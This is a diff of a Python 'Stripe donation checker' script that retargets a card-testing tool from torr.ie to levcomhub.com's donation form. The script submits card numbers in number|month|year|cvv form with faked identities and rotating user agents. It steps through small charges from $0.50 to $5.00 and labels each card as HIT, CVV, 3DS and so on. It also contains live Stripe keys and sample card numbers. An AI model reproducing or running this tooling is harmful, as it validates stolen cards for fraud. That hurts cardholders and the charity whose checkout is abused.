@@ -1,118 +1,72 @@
 import requests
-import json
 import time
 import random
 import uuid
-from datetime import datetime
 from faker import Faker
 
 fake = Faker("en_US")
 
 # ========== CLASSIFICATION KEYS ==========
-success_keys = ["appreciate", "appreciated", "Payment Success", "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!"]
-ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "incorrect_cvc", "cvc", "invalid cvc"]
-invalid_keys = ["Invalid account"]
+success_keys = [
+    "appreciate", "appreciated", "Payment Success", "redirect_to", 
+    "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", 
+    "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", 
+    "redirect_url", "Merci", "Form entry saved", "Success!",
+    "Donation Successful!"  # ← Levcomhub donation success message
+]
+ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "Your card number is incorrect", "number is incorrect"]
 declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "cannot process your order"]
-cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor"]
-insufficient_keys = ["Your card has insufficient funds.", "INSUFFICIENT_FUNDS", "insufficient_funds", "Insufficient Funds", "Insufficient"]
-payment_failed_keys = ["does not match the billing address"]
-expired_keys = ["card has expired", "expired card", "card expired", "expired"]
-incorrect_keys = ["card number is incorrect"]
-manycc_keys = ["Too Many Requests"]
-riskcc_keys = ["again in a little bit"]
-otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "CompletePaymentChallenge", "requires_action", "additional action before completion!", "nextAction"]
-cap_keys = ["reCaptcha"]
-exceed_keys = ["exceeding its amount limit"]
-proxyfailed_keys = ["Failed to perform"]
+cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor", "cvc"]
+insufficient_keys = ["Your card has insufficient funds.", "INSUFFICIENT_FUNDS", "insufficient_funds", "Insufficient Funds", "Insufficient", "low funds", "balance"]
+expired_keys = ["card has expired"]
+otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "CompletePaymentChallenge", "requires_action", "additional action before completion!", "nextAction", "3d_secure", "authenticate", "client_secret"]
 
-def check_expiry(mm, yy):
-    """Check if card is expired"""
-    try:
-        current_year = datetime.now().year % 100  # 2026 -> 26
-        current_month = datetime.now().month
-        
-        exp_year = int(yy)
-        exp_month = int(mm)
-        
-        # Convert 4-digit year to 2-digit if needed
-        if exp_year > 2000:
-            exp_year = exp_year % 100
-            
-        if exp_year < current_year:
-            return True, f"Card expired in {exp_month}/{exp_year} (current: {current_month}/{current_year})"
-        elif exp_year == current_year and exp_month < current_month:
-            return True, f"Card expired in {exp_month}/{exp_year} (current: {current_month}/{current_year})"
-        else:
-            return False, None
-    except:
-        return False, None
+# Amounts to try in order (from lowest to highest)
+TRY_AMOUNTS = ["0.50", "1.00", "1.50", "2.00", "2.50", "3.00", "3.50", "4.00", "4.50", "5.00"]
 
-def classify_response(last, mm=None, yy=None):
-    last_lower = last.lower()
-    
-    # FIRST: Check if card is expired (priority)
-    if mm and yy:
-        is_expired, expiry_msg = check_expiry(mm, yy)
-        if is_expired:
-            return "DEAD", "EXPIRED"
-    
+def classify_response(last):
+    last_lower = str(last).lower()
     if any(key.lower() in last_lower for key in success_keys): 
-        return "HIT", "HIT"
+        return "HIT"
     if any(key.lower() in last_lower for key in ccn_keys): 
-        return "CCN", "CCN"
+        return "CCN"
     if any(key.lower() in last_lower for key in cvv_keys): 
-        return "CVV", "CVV"
+        return "CVV"
     if any(key.lower() in last_lower for key in otp_keys): 
-        return "3DS", "3DS"
+        return "3DS"
     if any(key.lower() in last_lower for key in insufficient_keys): 
-        return "INSUFFICIENT", "LOW_FUND"
+        return "INSUFFICIENT"
     if any(key.lower() in last_lower for key in expired_keys): 
-        return "DEAD", "EXPIRED"
+        return "EXPIRED"
     if any(key.lower() in last_lower for key in declined_keys): 
-        return "DEAD", "DECLINED"
-    return "DEAD", last
+        return "DECLINED"
+    return "DEAD"
 
-# ========== HELPER FUNCTIONS ==========
 def gen_random_user_agent():
     chrome_version = random.randint(120, 137)
     user_agents = [
-        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
-        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36 Edg/{chrome_version}.0.0.0",
-        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
-        f"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
         f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
         f"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
-        f"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
-        f"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
-        f"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
         f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-        f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
         f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
-        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
-        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
     ]
     return random.choice(user_agents)
 
 def gen_random_name():
-    first_name = fake.first_name()
-    last_name = fake.last_name()
-    return first_name, last_name
+    return fake.first_name(), fake.last_name()
 
 def gen_random_email(first_name, last_name):
-    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@protonmail.com"]
-    random_num = random.randint(1000, 99999)
-    email = f"{first_name.lower()}{random_num}{random.choice(domains)}"
-    return email
+    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com"]
+    return f"{first_name.lower()}{random.randint(1000, 99999)}{random.choice(domains)}"
 
 def gen_random_guid():
     return f"{uuid.uuid4()}{random.randint(10000, 99999)}"
 
-# ========== MAIN TELE FUNCTION FOR torr.ie ==========
-def Tele(ccx: str, gate_type: str = "ch1"):
+def make_payment(ccx: str, charge_amount: str):
     """
-    Check credit card via torr.ie
-    Input: "card_number|month|year|cvv"
-    Returns: (response_message, amount, gateway_name)
+    Make a single payment attempt with specific amount
+    Returns: (status, message, used_amount)
     """
     
     # Parse card details
@@ -120,7 +74,7 @@ def Tele(ccx: str, gate_type: str = "ch1"):
     parts = ccx.split("|")
     
     if len(parts) != 4:
-        return "ERROR: Invalid format. Use: number|month|year|cvv", "0.64", "Stripe 0.64$"
+        return "ERROR", "Invalid format. Use: number|month|year|cvv", None
     
     n, mm, yy, cvc = parts
     
@@ -128,35 +82,17 @@ def Tele(ccx: str, gate_type: str = "ch1"):
     if len(yy) == 4 and yy.startswith("20"):
         yy = yy[2:4]
     
-    # ========== CHECK EXPIRY FIRST ==========
-    is_expired, expiry_msg = check_expiry(mm, yy)
-    if is_expired:
-        return f"📅 EXPIRED - {expiry_msg}", "0.64", "Stripe 0.64$"
-    
-    # Amount based on gate_type
-    if gate_type == "ch1":
-        charge_amount = "0.64"
-    elif gate_type == "ch2":
-        charge_amount = "0.75"
-    elif gate_type == "ch3":
-        charge_amount = "0.85"
-    elif gate_type == "ch4":
-        charge_amount = "1.00"
-    elif gate_type == "ch5":
-        charge_amount = "1.50"
-    elif gate_type == "ch6":
-        charge_amount = "2.50"
-    elif gate_type == "ch7":
-        charge_amount = "3.00"
-    else:
-        charge_amount = "0.64"
-    
-    gateway_name = f"Stripe {charge_amount}$"
-    
     # Generate random customer data
     first_name, last_name = gen_random_name()
     email = gen_random_email(first_name, last_name)
     full_name = f"{first_name} {last_name}"
+    name_for_stripe = full_name.replace(" ", "+")
+    
+    # Stripe publishable key for levcomhub.com
+    stripe_key = "pk_live_51JFgfTKqjmzJCbSr9wtxl0XojHckW6m9jJFVUKw1MHDix6dpGRuJAPXV0LRBU5y5r5FmIq8c3EVywaikYyU45Wg600Va8cE1WA"
+    wallet_config_id = "f6f3180e-b167-46ff-a87c-9198b18e1e84"
+    
+    session = requests.Session()
     
     # Generate random IDs for Stripe
     guid = gen_random_guid()
@@ -164,25 +100,17 @@ def Tele(ccx: str, gate_type: str = "ch1"):
     sid = gen_random_guid()
     client_session_id = gen_random_guid()
     
-    # Stripe publishable key for torr.ie (LIVE from curl)
-    stripe_key = "pk_live_51JVKouAs6DndN9b8mx4e9zfXHN3jWXh6L0V2n3xk59hs90Nqy9RuqM2nqdjQkKPOB5DwBgoe9poeThAhanhLNPi900zHJa87Tz"
-    
-    # Create session with cookies
-    session = requests.Session()
-    
     # Set cookies
     session.cookies.set('__stripe_mid', muid)
     session.cookies.set('__stripe_sid', sid)
-    session.cookies.set('_ga', f'GA1.1.{random.randint(1000000, 9999999)}.{int(time.time())}')
-    session.cookies.set('_gcl_au', f'1.1.{random.randint(100000000, 999999999)}.{int(time.time())}')
+    session.cookies.set('__cf_bm', f'{random.randint(100000000000, 999999999999)}.{int(time.time())}')
     
     # ========== STEP 1: Create Payment Method with Stripe API ==========
     url_stripe = "https://api.stripe.com/v1/payment_methods"
     
-    # Build POST data string
     stripe_data = (
         f'type=card'
-        f'&billing_details[name]={full_name.replace(" ", "+")}'
+        f'&billing_details[name]={name_for_stripe}'
         f'&card[number]={n}'
         f'&card[cvc]={cvc}'
         f'&card[exp_month]={mm}'
@@ -191,90 +119,72 @@ def Tele(ccx: str, gate_type: str = "ch1"):
         f'&muid={muid}'
         f'&sid={sid}'
         f'&pasted_fields=number'
-        f'&payment_user_agent=stripe.js%2F922d612e68%3B+stripe-js-v3%2F922d612e68%3B+card-element'
-        f'&referrer=https%3A%2F%2Ftorr.ie'
-        f'&time_on_page={random.randint(10000, 50000)}'
+        f'&payment_user_agent=stripe.js%2F03270cb259%3B+stripe-js-v3%2F03270cb259%3B+card-element'
+        f'&referrer=https%3A%2F%2Flevcomhub.com'
+        f'&time_on_page={random.randint(10000, 60000)}'
         f'&client_attribution_metadata[client_session_id]={client_session_id}'
         f'&client_attribution_metadata[merchant_integration_source]=elements'
         f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
         f'&client_attribution_metadata[merchant_integration_version]=2017'
+        f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
         f'&key={stripe_key}'
     )
     
     headers_stripe = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://js.stripe.com',
         'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
         'user-agent': gen_random_user_agent(),
     }
     
     try:
         response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
     except requests.exceptions.RequestException as e:
-        return f"NETWORK_ERROR: {str(e)}", charge_amount, gateway_name
+        return "ERROR", f"NETWORK_ERROR: {str(e)}", None
     
-    # Check if payment method was created successfully
     if response.status_code != 200:
         try:
             error_json = response.json()
-            error_msg = error_json.get('error', {}).get('message', response.text[:200])
-            # Check for expiry in error message
-            if "expired" in error_msg.lower():
-                return f"📅 EXPIRED CARD - {error_msg}", charge_amount, gateway_name
-            return f"STRIPE_ERROR: {error_msg}", charge_amount, gateway_name
+            error_msg = error_json.get('error', {}).get('message', response.text[:100])
+            return "ERROR", f"STRIPE_ERROR: {error_msg}", None
         except:
-            return f"STRIPE_ERROR: {response.text[:200]}", charge_amount, gateway_name
+            return "ERROR", f"STRIPE_ERROR: {response.text[:100]}", None
     
     try:
         response_json = response.json()
         if 'id' not in response_json:
-            return f"NO_PAYMENT_METHOD_ID: {response.text[:200]}", charge_amount, gateway_name
+            return "ERROR", "NO_PAYMENT_METHOD_ID", None
         payment_method_id = response_json['id']
     except Exception as e:
-        return f"JSON_PARSE_ERROR: {str(e)}", charge_amount, gateway_name
+        return "ERROR", f"JSON_PARSE_ERROR: {str(e)}", None
     
-    # ========== STEP 2: Charge via WordPress Admin AJAX ==========
-    url_wp = "https://torr.ie/wp-admin/admin-ajax.php"
+    # ========== STEP 2: Charge via WordPress Admin AJAX (Donation) ==========
+    url_wp = "https://levcomhub.com/wp-admin/admin-ajax.php"
     
-    # Generate random custom inputs (for anti-spam)
-    random_num = random.randint(10000, 99999)
-    random_word = fake.word().capitalize()
-    random_phone = f"07{random.randint(10000000, 99999999)}"
-    
-    wp_data = (
-        f'action=wp_full_stripe_inline_payment_charge'
-        f'&wpfs-form-name=default'
-        f'&wpfs-form-get-parameters=%7B%7D'
-        f'&wpfs-custom-amount-unique={charge_amount}'
-        f'&wpfs-custom-input%5B%5D={random_num}'
-        f'&wpfs-custom-input%5B%5D={random_word}'
-        f'&wpfs-custom-input%5B%5D={random_phone}'
-        f'&wpfs-card-holder-email={email}'
-        f'&wpfs-card-holder-name={full_name.replace(" ", "+")}'
-        f'&wpfs-stripe-payment-method-id={payment_method_id}'
-    )
+    wp_data = {
+        'action': 'wp_full_stripe_inline_donation_charge',
+        'wpfs-form-name': 'leverhulme_community_hub',
+        'wpfs-form-get-parameters': '%7B%7D',
+        'wpfs-custom-amount': 'other',
+        'wpfs-custom-amount-unique': charge_amount,
+        'wpfs-donation-frequency': 'one-time',
+        'wpfs-custom-input[]': str(random.randint(10000, 99999)),
+        'wpfs-card-holder-email': email,
+        'wpfs-card-holder-name': full_name,
+        'wpfs-terms-of-use-accepted': '1',
+        'wpfs-stripe-payment-method-id': payment_method_id,
+    }
     
     headers_wp = {
         'Accept': 'application/json, text/javascript, */*; q=0.01',
         'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://torr.ie',
-        'Referer': 'https://torr.ie/payments/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': gen_random_user_agent(),
+        'Origin': 'https://levcomhub.com',
+        'Referer': 'https://levcomhub.com/donate/',
         'X-Requested-With': 'XMLHttpRequest',
+        'User-Agent': gen_random_user_agent(),
         'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -283,77 +193,112 @@ def Tele(ccx: str, gate_type: str = "ch1"):
     try:
         r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
     except requests.exceptions.RequestException as e:
-        return f"WP_NETWORK_ERROR: {str(e)}", charge_amount, gateway_name
+        return "ERROR", f"WP_NETWORK_ERROR: {str(e)}", charge_amount
     
     # Parse response
     try:
         response_json = r2.json()
-        message = response_json.get('message', r2.text)
+        message = response_json.get('message', str(response_json))
         
-        # Classify the response (pass mm,yy for expiry check)
-        status, detail = classify_response(message, mm, yy)
+        # Check if this amount worked
+        status = classify_response(message)
         
+        # If we got a valid response
         if status == "HIT":
-            return f"✅ APPROVED - Payment Successful!", charge_amount, gateway_name
+            return "HIT", message, charge_amount
         elif status == "CCN":
-            return f"❌ CCN - Wrong card number", charge_amount, gateway_name
+            return "CCN", message, charge_amount
         elif status == "CVV":
-            return f"⚠️ CVV - Wrong CVV", charge_amount, gateway_name
+            return "CVV", message, charge_amount
         elif status == "3DS":
-            return f"🔐 3DS REQUIRED - {message}", charge_amount, gateway_name
+            return "3DS", message, charge_amount
         elif status == "INSUFFICIENT":
-            return f"💰 INSUFFICIENT FUNDS", charge_amount, gateway_name
+            return "INSUFFICIENT", message, charge_amount
         elif status == "EXPIRED":
-            return f"📅 EXPIRED CARD - Card has expired", charge_amount, gateway_name
+            return "EXPIRED", message, charge_amount
+        elif status == "DECLINED":
+            # Check if declined due to amount
+            if "amount" in str(message).lower() or "minimum" in str(message).lower():
+                return "AMOUNT_ERROR", message, charge_amount
+            return "DECLINED", message, charge_amount
         else:
-            return f"❌ {message}", charge_amount, gateway_name
+            return "UNKNOWN", message, charge_amount
             
-    except:
-        return r2.text, charge_amount, gateway_name
+    except Exception as e:
+        return "ERROR", f"PARSE_ERROR: {str(e)}", charge_amount
 
 
-# ========== TEST FUNCTION ==========
-if __name__ == "__main__":
-    print("=" * 50)
-    print("Torr.ie Stripe Checker")
-    print("=" * 50)
+def Tele(ccx: str):
+    """
+    Check credit card with automatic amount detection
+    Input: "card_number|month|year|cvv"
+    Returns: response string
+    """
     
-    # Test card
-    test_card = "4815821145363426|09|29|767"
+    # First, try with default amount
+    for amount in TRY_AMOUNTS:
+        status, message, used_amount = make_payment(ccx, amount)
+        
+        # If it's a card error (CCN, CVV, EXPIRED) - stop trying, return immediately
+        if status in ["CCN", "CVV", "EXPIRED", "3DS"]:
+            return f"[{status}] {message} (Amount: ${used_amount})"
+        
+        # If it's a HIT or INSUFFICIENT - success! return
+        if status in ["HIT", "INSUFFICIENT"]:
+            return f"[{status}] {message} (Amount: ${used_amount})"
+        
+        # If it's DECLINED but not amount-related, return
+        if status == "DECLINED":
+            return f"[{status}] {message} (Amount: ${used_amount})"
+        
+        # If it's AMOUNT_ERROR, continue to next amount
+        if status == "AMOUNT_ERROR":
+            print(f"    └─ Amount ${amount} failed, trying next...")
+            continue
+        
+        # If it's UNKNOWN or ERROR, try next amount
+        if status in ["UNKNOWN", "ERROR"]:
+            print(f"    └─ Amount ${amount} got {status}, trying next...")
+            continue
+    
+    # If we tried all amounts and none worked
+    return f"[AMOUNT_ERROR] Tried {', '.join(TRY_AMOUNTS)} but none worked"
+
+
+# ========== TEST ==========
+if __name__ == "__main__":
+    print("=" * 60)
+    print("Levcomhub.com - Stripe Donation Checker")
+    print("Auto Amount Detection: 0.50 → 5.00")
+    print("=" * 60)
+    
+    test_card = "4750556121828375|02|30|525"
     
     print(f"\n[+] Testing: {test_card}")
-    print("[+] Gateway: torr.ie")
-    print("-" * 50)
+    print("[+] Will try amounts: 0.50 → 1.00 → 1.50 → ... → 5.00")
+    print("-" * 60)
     
-    result, amount, gateway = Tele(test_card)
-    
-    print(f"Result: {result}")
-    print(f"Amount: ${amount}")
-    print(f"Gateway: {gateway}")
-    print("=" * 50)
-    
-    # Test expired card
-    print("\n[+] Testing Expired Card Detection:")
-    expired_test = "5156769084151142|05|26|802"
-    print(f"Testing: {expired_test}")
-    result, amount, gateway = Tele(expired_test)
-    print(f"Result: {result}")
-    print("=" * 50)
+    result = Tele(test_card)
+    print(f"\n📋 Final Result: {result}")
+    print("=" * 60)
     
     # Interactive mode
-    print("\n[+] Interactive Mode")
-    print("Enter card in format: number|month|year|cvv")
-    print("Type 'exit' to quit\n")
+    print("\n💬 Interactive Mode")
+    print("   Format: number|month|year|cvv")
+    print("   Type 'exit' to quit\n")
     
     while True:
-        card_input = input("Card: ").strip()
-        if card_input.lower() == 'exit':
+        try:
+            card_input = input("🔍 Card: ").strip()
+            if card_input.lower() == 'exit':
+                print("👋 Goodbye!")
+                break
+            if not card_input:
+                continue
+                
+            result = Tele(card_input)
+            print(f"📋 Result: {result}")
+            print("-" * 60)
+        except KeyboardInterrupt:
+            print("\n👋 Goodbye!")
             break
-        if not card_input:
-            continue
-            
-        result, amount, gateway = Tele(card_input)
-        print(f"Result: {result}")
-        print(f"Amount: ${amount}")
-        print(f"Gateway: {gateway}")
-        print("-" * 50)
